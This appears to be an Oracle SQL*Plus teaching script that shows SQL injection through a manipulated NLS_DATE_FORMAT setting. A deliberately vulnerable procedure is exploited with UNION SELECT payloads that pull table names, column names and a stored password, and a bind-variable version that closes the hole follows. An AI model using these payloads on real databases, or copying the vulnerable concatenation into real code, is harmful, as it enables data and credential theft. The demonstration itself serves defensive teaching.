connect /

set echo on
drop table user_pw purge;


create or replace procedure inj( p_date in date )
as
	l_rec   all_users%rowtype;
	c       sys_refcursor;
	l_query long;
begin
	l_query := '
	select * 
	  from all_users 
	 where created = ''' ||p_date ||'''';

	dbms_output.put_line( l_query );
	open c for l_query;

	for i in 1 .. 5
	loop
		fetch c into l_rec;
		exit when c%notfound;
		dbms_output.put_line( l_rec.username || '.....' );
	end loop;
	close c;
end;
/

exec inj( sysdate )

create table user_pw
( uname varchar2(30) primary key,
  pw    varchar2(30)
);
insert into user_pw
( uname, pw )
values ( 'TKYTE', 'TOP SECRET' );
commit;

grant execute on inj to scott;
connect scott/tiger

alter session set 
nls_date_format = '"''union select tname,0,null from tab--"';
exec ops$tkyte.inj( sysdate )
select * from ops$tkyte.user_pw;

alter session set 
nls_date_format = '"''union select tname||cname,0,null from col--"';
exec ops$tkyte.inj( sysdate )
alter session set 
nls_date_format = '"''union select uname,0,null from user_pw--"';

exec ops$tkyte.inj( sysdate )
alter session set 
nls_date_format = '"''union select pw,0,null from user_pw--"';

exec ops$tkyte.inj( sysdate )
connect /



create or replace procedure NOT_inj( p_date in date )
as
	l_rec   all_users%rowtype;
	c       sys_refcursor;
	l_query long;
begin
	l_query := '
	select * 
	  from all_users 
	 where created = :x';

	dbms_output.put_line( l_query );
	open c for l_query USING P_DATE;

	for i in 1 .. 5
	loop
		fetch c into l_rec;
		exit when c%notfound;
		dbms_output.put_line( l_rec.username || '.....' );
	end loop;
	close c;
end;
/
exec NOT_inj( sysdate )
